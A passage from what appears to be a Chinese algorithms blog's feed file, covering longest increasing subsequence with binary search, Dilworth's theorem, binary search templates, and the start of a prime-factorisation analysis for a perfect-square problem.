class="line">&#125;</span><br><span class="line">ans = max(ans, f[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bsearch</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n,<span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">        <span class="comment">//int mid = l + ((r-l)&gt;&gt;1); // 避免溢出</span></span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &gt;= key)</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bsearch2</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line"><span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line"><span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] &gt;= key)</span><br><span class="line">r = mid;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">l = mid + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dp2</span><span class="params">(<span class="type">int</span> s[], <span class="type">int</span> low[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i)</span><br><span class="line">low[i] = <span class="number">0x7fffffff</span>;</span><br><span class="line">low[<span class="number">0</span>] = s[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>;i &lt; n;++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (s[i] &gt; low[ans])</span><br><span class="line">low[++ans] = s[i];</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 两个二分查找模板均可</span></span><br><span class="line"><span class="comment">// int pos = bsearch(low, ans + 1, s[i]);</span></span><br><span class="line">            <span class="type">int</span> pos = bsearch2(low, ans + <span class="number">1</span>, s[i]);</span><br><span class="line">low[pos] = s[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans + <span class="number">1</span>; <span class="comment">// ans is the index of the last element</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> s[MAXN];</span><br><span class="line"><span class="type">int</span> f[MAXN];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;++i)</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; s[i];</span><br><span class="line"><span class="comment">// int ans = dp(s, f, n); // 朴素dp</span></span><br><span class="line"><span class="type">int</span> ans = dp2(s, f, n); <span class="comment">// greedy + binary search</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dilworth定理">Dilworth定理</h2><p>狄尔沃斯定理亦称偏序集分解定理，该定理断言：对于任意有限偏序集，其最大反链中元素的数目必等于最小链划分中链的数目。此定理的对偶形式亦真，它断言：对于任意有限偏序集，其最长链中元素的数目必等于其最小反链划分中反链的数目。</p><p>在子序列问题中,可以如此理解,即:</p><p>把序列分成不上升子序列的最少个数,等于序列的最长上升子序列的长度.</p><p>把序列分成不下降子序列的最少个数,等于序列的最长下降子序列的长度.</p><br><p>利用该定理可以简化很多子序列问题.</p><h3 id="p1020-导弹拦截">P1020 导弹拦截</h3><p>问题2就等价于求最长上升子序列的长度.</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 子序列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分查找模板</title>
      <link href="/2024b79ee0df7e0a/"/>
      <url>/2024b79ee0df7e0a/</url>
      
        <content type="html"><![CDATA[<h1 id="查找序列中第一个满足check-条件的值">查找序列中第一个满足check()条件的值</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &gt;= <span class="number">5</span>; <span class="comment">// 举例,寻找第一个大于等于5的数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">bsearch</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">        <span class="comment">//int mid = l + ((r-l)&gt;&gt;1); // 避免溢出</span></span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(arr[mid]))</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">bsearch2</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(arr[mid]))</span><br><span class="line">            r = mid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意:这样的代码是<code>错误</code>的(?):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bsearch3</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="comment">//int mid = l + ((r-l+1)&gt;&gt;1); // 避免溢出</span></span><br><span class="line">        <span class="type">int</span> mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(arr[mid]))</span><br><span class="line">            r = mid - <span class="number">1</span>; <span class="comment">// mid被排除在区间外!</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尽管从边界处理上没有问题,但是r=mid-1导致mid被排除在区间外,并且无法再次被两个指针的任何一个指向.</p><h1 id="查找某个具体的值是否存在">查找某个具体的值是否存在</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bsearch</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">        <span class="comment">//int mid = l + ((r-l+1)&gt;&gt;1); // 避免溢出</span></span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] == key)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; key)</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">bsearch2</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="comment">//int mid = l + ((r-l+1)&gt;&gt;1); // 避免溢出</span></span><br><span class="line">        <span class="type">int</span> mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] == key)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; key)</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断是否相等</span></span><br><span class="line">    <span class="keyword">if</span> (arr[l] == key)</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">bsearch3</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="comment">//int mid = l + ((r-l+1)&gt;&gt;1); // 避免溢出</span></span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &gt;= key)</span><br><span class="line">            r = mid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断是否相等</span></span><br><span class="line">    <span class="keyword">if</span> (arr[l] == key)</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 二分查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>P8754完全平方数</title>
      <link href="/202436b5e86487f2/"/>
      <url>/202436b5e86487f2/</url>
      
        <content type="html"><![CDATA[<h1 id="题目">题目</h1><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240116112211944.png" alt="image-20240116112211944" style="zoom:50%;" /><p>问题规模:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240116112229229.png" alt="image-20240116112229229" style="zoom:50%;" /><h1 id="分析">分析</h1><p>本题为质因数分解.</p><p>本题的证明(不保证正确性,仅仅为个人思考的过程):</p><p>题目中N,X均为正整数(为避免冲突使用大写).</p><p>则由题意得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi><mtext>正整数</mtext><mi>K</mi><mo separator="true">,</mo><mtext>使得</mtext><mi>N</mi><mo>∗</mo><mi>X</mi><mo>=</mo><msup><mi>K</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\exists 正整数K,使得N*X = K^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∃</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>,对3者分解质因数得:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><msub><mi>q</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>q</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>q</mi><mn>3</mn></msub><mo>∗</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∗</mo><msub><mi>q</mi><mi>n</mi></msub><mspace linebreak="newline"></mspace><mi>X</mi><mo>=</mo><msub><mi>p</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>p</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>p</mi><mn>3</mn></msub><mo>∗</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∗</mo><msub><mi>p</mi><mi>m</mi></msub><mspace linebreak="newline"></mspace><mi>K</mi><mo>=</mo><msub><mi>s</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>s</mi><mn>3</mn></msub><mo>∗</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∗</mo><msub><mi>s</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">N = q_1 * q_2 * q_3 * ... * q_n \\X = p_1 * p_2 * p_3 * ... * p_m \\K = s_1 * s_2 * s_3 * ... * s_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>p</mi><mi>i</mi></msub><mtext>和</mtext><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">q_i,p_i和s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>均为素数,则有<span class="katex"><span class="katex-mathml"><math 